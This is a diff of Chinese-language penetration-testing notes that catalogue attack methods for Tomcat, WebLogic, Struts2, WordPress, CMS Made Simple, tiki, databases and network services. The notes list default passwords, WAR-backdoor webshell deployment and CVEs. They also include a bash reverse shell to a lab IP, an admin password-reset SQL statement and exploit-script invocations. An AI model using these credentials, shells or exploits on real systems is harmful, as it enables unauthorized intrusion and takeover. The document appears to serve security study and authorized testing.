@@ -36,120 +36,125 @@
 漏洞验证/漏洞攻击
 ----------------------------------------
 
-Web
-----------------------------------------
+Tomcat
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 端口号：8080
++ 攻击方法
+	- 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。
+	- 在管理后台部署 war 后门文件
+	- 远程代码执行漏洞
++ 常见漏洞
+	- CVE-2016-8735
+	- CVE-2017-12615
 
-自定义 Web 应用
+Jboss
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 端口：8080
++ 攻击方法
+	- 弱口令，爆破
+	- 管理后台部署 war 后门
+	- 反序列化
+	- 远程代码执行
++ 常见漏洞
+	- CVE-2015-7501
+	- CVE-2017-7504
+	- CVE-2017-12149
 
-Web 中间件
+WebLogic
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- Tomcat
-	+ 端口号：8080
-	+ 攻击方法
-		- 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。
-		- 在管理后台部署 war 后门文件
-		- 远程代码执行漏洞
-	+ 常见漏洞
-		- CVE-2016-8735
-		- CVE-2017-12615
-- Jboss
-	+ 端口：8080
-	+ 攻击方法
-		- 弱口令，爆破
-		- 管理后台部署 war 后门
-		- 反序列化
-		- 远程代码执行
-	+ 常见漏洞
-		- CVE-2015-7501
-		- CVE-2017-7504
-		- CVE-2017-12149
-- WebLogic
-	+ 端口：7001，7002
-	+ 攻击方法
-		+ 弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
-		+ 管理后台部署 war 后门
-		+ SSRF
-		+ 反序列化漏洞
-		+ weblogic_uac
-	+ 常见漏洞
-		- CVE-2019-2725
-		- CVE-2019-2729
-		- CVE-2018-3191
-		- CVE-2018-2628
-		- CVE-2018-2893
-		- CVE-2018-2894
-		- CVE-2017-3506
-		- CVE-2017-10271
-		- CVE-2017-3248
-		- CVE-2016-0638
-		- CVE-2016-3510
-		- CVE-2015-4852
-		- CVE-2014-4210
-- WebSphere
-	+ 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090
-	+ 攻击方法
-		+ 控制台登录爆破
-		+ 很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。
-		+ 反序列化
-		+ 任意文件泄露
-		
-Web 框架
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- Struts2
-	+ 可利用漏洞
-		+ S2-048
-		+ S2-052
-		+ S2-053
-		+ S2-057
-		+ S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
-		+ S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
-		+ S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1
-		+ S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28
-		+ S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16
-		+ S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1
-		+ S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15
-		+ S2-013 CVE-2013-1966 Struts 2.0.0-2.3.1
-		+ S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1
-		+ S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1
-	+ 扫描工具
-		+ https://github.com/x51/STS2G/releases
-		+ ``ST2SG --mode scan --url http://xxx.com/index.action``
-- Spring 框架
-	+ 可利用漏洞
-		+ CVE-2010-1622
-		+ CVE-2018-1274
-		+ CVE-2018-1270
-		+ CVE-2018-1273
-		+ 反序列化
-		+ 目录穿越
-		
-Web 服务器
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- IIS：Windows 的 WWW 服务器
-	+ https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
-	+ http://www.freebuf.com/articles/4908.html
-	+ https://www.anquanke.com/post/id/85811
-	+ IIS，开启了 WebDAV，可以直接详服务器 PUT 文件
-	+ 短文件名枚举漏洞
-	+ 远程代码执行
-	+ 提权漏洞
-	+ 解析漏洞
-- Apache 
-	+ 解析漏洞
-	+ 目录遍历
-- Nginx 
-	+ https://www.seebug.org/vuldb/ssvid-92538
-	+ 解析漏洞
-	+ 目录遍历
-	+ CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限
-- lighttpd
-	+ 目录遍历
++ 端口：7001，7002
++ 攻击方法
+	+ 弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic
+	+ 管理后台部署 war 后门
+	+ SSRF
+	+ 反序列化漏洞
+	+ weblogic_uac
++ 常见漏洞
+	- CVE-2019-2725
+	- CVE-2019-2729
+	- CVE-2018-3191
+	- CVE-2018-2628
+	- CVE-2018-2893
+	- CVE-2018-2894
+	- CVE-2017-3506
+	- CVE-2017-10271
+	- CVE-2017-3248
+	- CVE-2016-0638
+	- CVE-2016-3510
+	- CVE-2015-4852
+	- CVE-2014-4210
 
-常见运维系统
-----------------------------------------
-一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。
-内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。
+WebSphere
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090
++ 攻击方法
+	+ 控制台登录爆破
+	+ 很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。
+	+ 反序列化
+	+ 任意文件泄露
+
+Struts2
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 可利用漏洞
+	+ S2-048
+	+ S2-052
+	+ S2-053
+	+ S2-057
+	+ S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
+	+ S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
+	+ S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1
+	+ S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28
+	+ S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16
+	+ S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1
+	+ S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15
+	+ S2-013 CVE-2013-1966 Struts 2.0.0-2.3.1
+	+ S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1
+	+ S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1
++ 扫描工具
+	+ https://github.com/x51/STS2G/releases
+	+ ``ST2SG --mode scan --url http://xxx.com/index.action``
+
+Spring 框架
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 可利用漏洞
+	+ CVE-2010-1622
+	+ CVE-2018-1274
+	+ CVE-2018-1270
+	+ CVE-2018-1273
+	+ 反序列化
+	+ 目录穿越
+
+IIS：Windows 的 WWW 服务器
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
++ http://www.freebuf.com/articles/4908.html
++ https://www.anquanke.com/post/id/85811
++ IIS，开启了 WebDAV，可以直接详服务器 PUT 文件
++ 短文件名枚举漏洞
++ 远程代码执行
++ 提权漏洞
++ 解析漏洞
+
+Apache
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 解析漏洞
++ 目录遍历
+
+Apache Dubbo
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CVE-2020-1948 反序列化漏洞利用
++ https://blog.csdn.net/weixin_46137328/article/details/107194560
+
+Nginx
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ https://www.seebug.org/vuldb/ssvid-92538
++ 解析漏洞
++ 目录遍历
++ CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限
+
+lighttpd
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 目录遍历
 
 宝塔
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -221,9 +226,6 @@ Splunk
 	+ 命令注入
 	+ 服务端请求伪造
 
-常见Web应用
-----------------------------------------
-
 邮件系统
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用：
@@ -235,65 +237,59 @@ Splunk
 - Exchange
 - IBM Lotus
 
-CMS应用
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- thinkphp
-	+ 漏扫工具
-		- https://github.com/Lucifer1993/TPscan
-		- https://github.com/theLSA/tp5-getshell
 
-- wordpress
-	+ 扫描插件和主题是否包含漏洞
-	+ 拿到wp网站登录用户名和密码
-		- 可通过上传主题文件来getshell，首先先去官网下载一个主题压缩包，之后将反弹shell的php代码写入shell.php中，然后将其放入压缩包一起上传
-		- shell目录：/wp-content/themes/[主题名]/[shell文件名]
-		- 通过主题编辑修改php页面
-	+ xmlrpc.php
-		- 查看支持的方案
-		
+wordpress
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 扫描插件和主题是否包含漏洞
++ 拿到wp网站登录用户名和密码
+	- 可通过上传主题文件来getshell，首先先去官网下载一个主题压缩包，之后将反弹shell的php代码写入shell.php中，然后将其放入压缩包一起上传
+	- shell目录：/wp-content/themes/[主题名]/[shell文件名]
+	- 通过主题编辑修改php页面
++ xmlrpc.php
+	- 查看支持的方案
+	
+	::
+	
+		POST /xmlrpc.php HTTP/1.1
+		Host: 192.168.100.106
+		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+		Content-Type: text/xml;charset=UTF-8
+		Content-Length: 128
+
+		<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
+
+CMS Made Simple
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 数据库更改密码方法
+	- 前提：登录数据库
+	- ``update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username = 'admin';``
++ 反弹shell
+	- 前提：登录系统
+	- Extensions/User Defined Tags
+		::
+			
+			vps开启监听
+			修改任何一个tag的code，点击apply，点击run
+			echo system("bash -c 'bash -i >& /dev/tcp/192.168.100.108/4444 0>&1'");
+
+tiki
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CVE-2020-15906
+	- 利用条件：tiki<21.2
+	- 免密码登录
 		::
 		
-			POST /xmlrpc.php HTTP/1.1
-			Host: 192.168.100.106
-			User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
-			Content-Type: text/xml;charset=UTF-8
-			Content-Length: 128
-
-			<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
-
-- CMS Made Simple
-	+ 数据库更改密码方法
-		- 前提：登录数据库
-		- ``update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username = 'admin';``
-	+ 反弹shell
-		- 前提：登录系统
-		- Extensions/User Defined Tags
-			::
-				
-				vps开启监听
-				修改任何一个tag的code，点击apply，点击run
-				echo system("bash -c 'bash -i >& /dev/tcp/192.168.100.108/4444 0>&1'");
+			https://www.exploit-db.com/exploits/48927
+			python 48927.py 192.168.100.103
+			打开burpsuite，开启拦截
+			浏览器登录admin，输入密码
+			bp去掉密码，forward
 			
-- tiki
-	+ CVE-2020-15906
-		- 利用条件：tiki<21.2
-		- 免密码登录
-			::
-			
-				https://www.exploit-db.com/exploits/48927
-				python 48927.py 192.168.100.103
-				打开burpsuite，开启拦截
-				浏览器登录admin，输入密码
-				bp去掉密码，forward
-				
-		- 命令执行
-			::
-			
-				https://srcincite.io/pocs/cve-2021-26119.py.txt
-				python cve-2021-26119.py 192.168.100.103 /tiki/ whoami
-
-数据库/缓存/消息服务
-----------------------------------------
+	- 命令执行
+		::
+		
+			https://srcincite.io/pocs/cve-2021-26119.py.txt
+			python cve-2021-26119.py 192.168.100.103 /tiki/ whoami
 
 MySQL数据库
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -376,9 +372,6 @@ DB2 数据库
 - 攻击方法
 	+ 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）
 
-常见服务/协议
-----------------------------------------
-
 FTP 服务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 FTP服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；
@@ -391,14 +384,14 @@ FTP服务我分为两种情况，第一种是使用系统软件来配置，比�
 	+ 后门 vsftp
 	+ 远程溢出
 	+ 跳转攻击
-	
+
 NFS 服务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。
 
 - 攻击方法
 	+ 未授权访问
-	
+
 Samba服务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。
@@ -495,9 +488,6 @@ DHCP服务
 - 默认端口：67&68、546（DHCP Failover做双机热备的）
 - 攻击方式：
 	+ DHCP劫持
-	
-云环境
-----------------------------------------
 
 VMware
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -540,9 +530,6 @@ Linux核心对名字空间的支持完全隔离了工作环境中应用程序的
 	+ 拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。
 	+ 容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。
 	+ 有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。
-	
-大数据
-----------------------------------------
 
 Elsaticsearch
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
